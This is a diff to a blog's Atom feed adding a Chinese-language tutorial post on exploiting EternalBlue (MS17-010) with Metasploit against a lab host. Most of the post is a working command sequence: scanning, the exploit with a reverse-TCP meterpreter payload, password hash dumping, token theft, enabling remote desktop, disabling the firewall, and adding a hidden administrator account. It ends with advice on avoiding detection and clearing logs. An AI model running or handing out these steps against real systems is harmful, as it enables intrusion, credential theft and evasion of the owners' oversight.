@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-11-03T12:25:07.710Z</updated>
+  <updated>2018-11-03T16:04:56.142Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>永恒之蓝的利用与提权</title>
+    <link href="http://yoursite.com/2018/11/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83/"/>
+    <id>http://yoursite.com/2018/11/04/永恒之蓝的利用与提权/</id>
+    <published>2018-11-03T16:07:19.617Z</published>
+    <updated>2018-11-03T16:04:56.142Z</updated>
+    
+    <content type="html"><![CDATA[<p>永恒之蓝是指2017年5月13日起，全球范围内爆发的基于Windows网络共享协议进行攻击传播的蠕虫<a href="https://baike.baidu.com/item/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/325864" target="_blank" rel="noopener">恶意代码</a>，不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。<a href="https://baike.baidu.com/item/%E8%8B%B1%E5%9B%BD/144602" target="_blank" rel="noopener">英国</a>、<a href="https://baike.baidu.com/item/%E4%BF%84%E7%BD%97%E6%96%AF/125568" target="_blank" rel="noopener">俄罗斯</a>、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p><p>下面我们就利用永恒之蓝进行内网渗透</p><p>search ms17-010</p><p>查找ms17-010模块</p><p><img src="https://i.loli.net/2018/11/03/5bddbe36edb7d.png" alt="1541258702419"></p><p> use auxiliary/scanner/smb/smb_ms17_010</p><p>set rhosts 192.168.174.134</p><p>run</p><p><img src="https://i.loli.net/2018/11/03/5bddbead5dfce.png" alt=""></p><p>smb协议的445端口处于开启状态</p><p>使用漏洞利用模块，并建立反向tcp连接</p><p>use exploit/windows/smb/ms17_010_eternalblue</p><p>set payload windows/x64/meterpreter/reverse_tcp</p><p>set rhost 192.168.174.134</p><p>set lhost 192.168.174.133</p><p>exploit</p><p><img src="https://i.loli.net/2018/11/03/5bddbf80dce15.png" alt=""></p><p>反弹shell成功。</p><p>sysinfo查询目标系统信息</p><p><img src="https://i.loli.net/2018/11/03/5bddc01e816e4.png" alt=""></p><p>screenshot对目标主机进行截图</p><p>getuid查看当前用户权限</p><p>hashdump获取用户的登录名和密码</p><p>ps 查看目标机器进程，找出域控账户运行的进程ID</p><p>load incognito由于目前我们的身份是system的权限，为了方便渗透，需进行身份令牌的窃取，拿到administrator的token。</p><p>扮演一个帐户从一个特定进程偷取令牌。为此，我们需要“incognito”扩展，使用“steal_token+PID”这个例子中我们使用的是steal_token 1148，其中由前面执行ps后得到的信息可知，PID为1148权限为administrator，所以我们在执行命令后虽然提示错误信息，但是它仍会被成功在后台执行，所以在运行steal_token后核实UID，我们的权限就变为了administrator了</p><p>首先使用ps查看pid对应的用户。这里就拿system的pid了。</p><p><img src="https://i.loli.net/2018/11/03/5bddc18feefa2.png" alt=""></p><p>steal_token 3056</p><p>此时的身份便是system了，</p><p>run getgui -e开启远程桌面</p><p><img src="https://i.loli.net/2018/11/03/5bddc26806fe1.png" alt=""></p><p>显示远程桌面已经开启</p><p>使用kali直接连接远程桌面：</p><p>rdesktop 192.168.174.134</p><p><img src="https://i.loli.net/2018/11/03/5bddc2f09958d.png" alt=""></p><p>但是此时的我们并没有用户名和密码，所以接着我们就创建用户吧。</p><p>shell获取目标主机的shell。</p><p><img src="https://i.loli.net/2018/11/03/5bddc36db916f.png" alt=""></p><p>netsh adcfirewall set allprofiles state off关闭防火墙</p><p>net user volcano18 123456 /add新建用户</p><p>net localgroup administrators volcano18 /add添加到管理员组</p><p>net user查看所有用户</p><p>用户创建完成了，下一步就直接连接远程桌面吧：</p><p>rdesktop 192.168.174.134在kali中使用该命令进行远程连接</p><p>连接成功。</p><p><img src="https://i.loli.net/2018/11/03/5bddc4d804a34.png" alt=""></p><p>如果其他账户也在线的话，就会出现这种情况。</p><p><img src="https://i.loli.net/2018/11/03/5bddc53b8f360.png" alt=""></p><p>如果点是，其他账户就会被退出，其中有30秒等待对方确认的时间，若其他账户未操作，则默认退出，我们新建的账户便可以进入系统了。（所以最好在别人不在时，进行该操作！会直接被发现）</p><p>渗透基本完成了，下一步就是清除日志了并且将刚刚创建的用户删除。</p><p>net user volcano18 /del删除用户</p><p>在metasploit中使用命令clearev清除日志</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;永恒之蓝是指2017年5月13日起，全球范围内爆发的基于Windows网络共享协议进行攻击传播的蠕虫&lt;a href=&quot;https://baike.baidu.com/item/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/325864&quot; targ
+      
+    
+    </summary>
+    
+      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>整数规划算法</title>
